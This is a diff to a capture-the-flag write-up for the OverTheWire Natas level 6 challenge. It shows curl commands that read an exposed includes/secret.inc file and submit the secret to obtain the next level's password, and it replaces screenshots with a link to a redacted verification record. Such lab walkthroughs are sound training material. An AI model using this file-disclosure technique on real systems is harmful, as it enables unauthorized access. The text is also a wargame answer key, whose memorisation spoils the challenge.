@@ -16,7 +16,7 @@ The source view shows it includes `includes/secret.inc`. A `.inc` file isn't map
 curl -sS --user natas6 http://natas6.natas.labs.overthewire.org/includes/secret.inc
 ```
 
-That hands over the secret. Submit it back to the form:
+The response contains the secret. Submit it to the form:
 
 ```sh
 curl -sS --user natas6 --data-urlencode 'secret=<value>' -d 'submit=Submit' \
@@ -25,11 +25,9 @@ curl -sS --user natas6 --data-urlencode 'secret=<value>' -d 'submit=Submit' \
 
 The page returns natas7's password.
 
-## Screenshots
+## Verification record
 
-![013-natas-method.png](../screenshots/013-natas-method.png)
-
-![013-natas-verify.png](../screenshots/013-natas-verify.png)
+The [saved authentication ledger](../evidence/ready-natas/natas-verification-redacted.json) records the method check and next-level authentication. Runtime passwords are redacted in that ledger.
 
 ## Flag
 
